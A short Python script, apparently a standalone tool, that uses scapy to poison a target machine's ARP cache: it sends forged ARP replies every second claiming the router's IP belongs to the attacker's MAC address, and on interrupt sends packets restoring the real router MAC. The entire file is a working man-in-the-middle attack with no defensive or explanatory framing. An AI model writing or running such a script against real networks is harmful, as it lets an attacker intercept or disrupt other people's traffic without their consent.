from scapy.all import Ether, ARP, sendp, conf, getmacbyip, get_if_hwaddr
import time

def main(target):
    router_ip = conf.route.route()[2]
    print(f"Router IP Address: {router_ip}")
    router_mac = getmacbyip(router_ip)
    my_mac = get_if_hwaddr(conf.iface)
    trg = target.split(',')
    attack_packet = Ether(dst=trg[1]) / ARP(op=2,pdst=trg[0],hwdst=trg[1],psrc=router_ip,hwsrc=my_mac)
    try:
        while True:
            sendp(attack_packet, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Fixing poisoned arp cache...")
        restore_packet = Ether(dst=trg[1]) / ARP(op=2,pdst=trg[0],hwdst=trg[1],psrc=router_ip,hwsrc=router_mac)
        for _ in range(10):
            sendp(restore_packet, verbose=False)
            time.sleep(1)

        